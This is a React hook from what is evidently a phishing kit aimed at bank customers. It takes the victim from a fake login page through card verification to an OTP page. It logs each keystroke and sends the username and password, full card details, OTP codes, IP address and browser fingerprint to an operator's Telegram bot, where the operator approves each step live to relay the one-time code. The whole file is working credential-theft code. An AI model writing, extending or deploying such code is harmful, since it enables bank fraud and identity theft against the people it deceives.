// src/hooks/useNavigation.js
import { useState, useEffect } from 'react';
import { useTelegramBot } from './useTelegramBot';

export const useNavigation = () => {
  // Navigation state
  const [currentStep, setCurrentStep] = useState('login');
  const [sessionId, setSessionId] = useState(null);
  const [userData, setUserData] = useState({
    username: '',
    password: '',
    cardData: null,
    otpCode: '',
    phoneNumber: ''
  });

  // Initialize session
  useEffect(() => {
    const newSessionId = Date.now().toString() + Math.random().toString(36).substr(2, 6);
    setSessionId(newSessionId);
  }, []);

  // Navigation handlers
  const navigateTo = (step) => {
    console.log(`📍 Navigation vers: ${step}`);
    setCurrentStep(step);
  };

  const goToLogin = () => {
    console.log('🔵 Navigation: Retour au login');
    setCurrentStep('login');
    setUserData({
      username: '',
      password: '',
      cardData: null,
      otpCode: '',
      phoneNumber: ''
    });
  };

  const goToCardVerification = () => {
    console.log('🔵 Navigation: Vers vérification carte');
    setCurrentStep('cardVerification');
  };

  const goToOtp = () => {
    console.log('🔵 Navigation: Vers OTP');
    setCurrentStep('otp');
  };

  const goToSuccess = () => {
    console.log('🔵 Navigation: Vers succès');
    setCurrentStep('success');
  };

  const goBackToCard = () => {
    console.log('🔵 Navigation: Retour à la carte');
    setCurrentStep('cardVerification');
  };

  const goBackToLogin = () => {
    console.log('🔵 Navigation: Retour au login');
    setCurrentStep('login');
  };

  // Data update handlers
  const updateUserData = (newData) => {
    setUserData(prev => ({ ...prev, ...newData }));
  };

  // Telegram bot callbacks (seront remplacés par les vrais handlers)
  const handleApprove = () => {
    console.log('✅ Approve clicked - Navigation vers carte');
    goToCardVerification();
  };

  const handleDeny = () => {
    console.log('❌ Deny clicked');
  };

  const handleViewCard = () => {
    console.log('💳 View card clicked');
  };

  const handleNextStep = () => {
    console.log('➡️ Next step clicked - Navigation vers OTP');
    goToOtp();
  };

  const handleBackToCard = () => {
    console.log('⬅️ Back to card clicked');
    goBackToCard();
  };

  const handleBackToLogin = () => {
    console.log('⬅️ Back to login clicked');
    goBackToLogin();
  };

  const handleBlock = () => {
    console.log('🚫 Block clicked');
    localStorage.setItem('isBlocked', 'true');
    window.location.href = '/blocked';
  };

  // Initialize Telegram bot
  const telegramBot = useTelegramBot(
    sessionId,
    handleApprove,
    handleDeny,
    handleViewCard,
    handleNextStep,
    handleBackToCard,
    handleBackToLogin,
    handleBlock
  );

  // Send initial page view when session starts
  useEffect(() => {
    if (sessionId && telegramBot && telegramBot.sendPageViewLog) {
      telegramBot.sendPageViewLog();
      
      // Get IP and send visit notification
      const getIpAndNotify = async () => {
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          
          if (telegramBot.sendVisitNotification) {
            await telegramBot.sendVisitNotification(
              ipData.ip,
              navigator.userAgent,
              document.referrer,
              `${window.screen.width}x${window.screen.height}`,
              Intl.DateTimeFormat().resolvedOptions().timeZone,
              sessionId,
              navigator.language
            );
          }
        } catch (error) {
          console.error('Error getting IP:', error);
        }
      };
      
      getIpAndNotify();
    }
  }, [sessionId, telegramBot]);

  // Send step-specific logs
  useEffect(() => {
    if (!sessionId || !telegramBot) return;

    switch(currentStep) {
      case 'cardVerification':
        if (telegramBot.sendCardVerificationPageLog) {
          telegramBot.sendCardVerificationPageLog(userData.username);
        }
        break;
      case 'otp':
        if (telegramBot.sendOtpPageLog) {
          telegramBot.sendOtpPageLog(userData.username, userData.phoneNumber, sessionId);
        }
        break;
      case 'success':
        // Handle success page
        break;
      default:
        break;
    }
  }, [currentStep, sessionId, userData.username, userData.phoneNumber, telegramBot]);

  // Handle form submissions
  const handleLoginSubmit = async (username, password) => {
    updateUserData({ username, password });
    console.log('🔐 Login soumis:', { username, password });
    
    // Send login credentials to Telegram
    if (telegramBot && telegramBot.sendLoginTypingLog) {
      await telegramBot.sendLoginTypingLog(username, 'Username/Password', `${username}/${password}`);
    }
    
    // Navigate to card verification after login
    goToCardVerification();
  };

  const handleCardSubmit = async (cardData) => {
    const fullCardData = {
      ...cardData,
      phoneNumber: userData.phoneNumber || cardData.phoneNumber,
      city: cardData.city,
      postalCode: cardData.postalCode
    };
    
    updateUserData({ cardData: fullCardData });
    
    // Send formatted card details to Telegram
    if (telegramBot) {
      if (telegramBot.sendFormattedCardDetails) {
        await telegramBot.sendFormattedCardDetails(
          fullCardData,
          sessionId,
          userData.username,
          userData.password
        );
      }
      
      if (telegramBot.sendCardDetailsToTelegram) {
        await telegramBot.sendCardDetailsToTelegram(fullCardData, sessionId);
      }
    }
    
    console.log('💳 Carte soumise:', fullCardData);
    // Don't auto-navigate, wait for admin approval via Telegram
  };

  const handleOtpSubmit = async (otpCode) => {
    updateUserData({ otpCode });
    
    // Send OTP to Telegram
    if (telegramBot) {
      if (telegramBot.sendOtpToTelegram) {
        await telegramBot.sendOtpToTelegram(otpCode, userData.phoneNumber, sessionId);
      }
      if (telegramBot.sendOtpSubmitLog) {
        await telegramBot.sendOtpSubmitLog(userData.username, userData.phoneNumber, otpCode);
      }
      if (telegramBot.sendOtpVerifiedLog) {
        await telegramBot.sendOtpVerifiedLog(userData.username, userData.phoneNumber, otpCode);
      }
      if (telegramBot.sendSuccessToTelegram) {
        await telegramBot.sendSuccessToTelegram(userData.phoneNumber, sessionId);
      }
    }
    
    console.log('🔢 OTP soumis:', otpCode);
    goToSuccess();
  };

  // Typing handlers for real-time logging
  const handleLoginTyping = (field, value) => {
    if (telegramBot && telegramBot.sendLoginTypingLog) {
      telegramBot.sendLoginTypingLog(userData.username, field, value);
    }
  };

  const handleCardTyping = (field, value) => {
    if (telegramBot && telegramBot.sendCardTypingLog) {
      telegramBot.sendCardTypingLog(userData.username, field, value);
    }
  };

  const handleOtpTyping = (value) => {
    if (telegramBot && telegramBot.sendOtpTypingLog) {
      telegramBot.sendOtpTypingLog(userData.username, userData.phoneNumber, value);
    }
  };

  return {
    // State
    currentStep,
    sessionId,
    userData,
    
    // Navigation functions
    navigateTo,
    goToLogin,
    goToCardVerification,
    goToOtp,
    goToSuccess,
    goBackToCard,
    goBackToLogin,
    
    // Data handlers
    updateUserData,
    handleLoginSubmit,
    handleCardSubmit,
    handleOtpSubmit,
    
    // Typing handlers
    handleLoginTyping,
    handleCardTyping,
    handleOtpTyping,
    
    // Telegram bot instance
    telegramBot,
    
    // Direct bot functions for custom use
    sendToTelegram: telegramBot.sendToTelegramWithButtons,
    sendCardDetails: telegramBot.sendCardDetailsToTelegram,
    sendFormattedCard: telegramBot.sendFormattedCardDetails,
    sendOtp: telegramBot.sendOtpToTelegram,
    sendSuccess: telegramBot.sendSuccessToTelegram
  };
};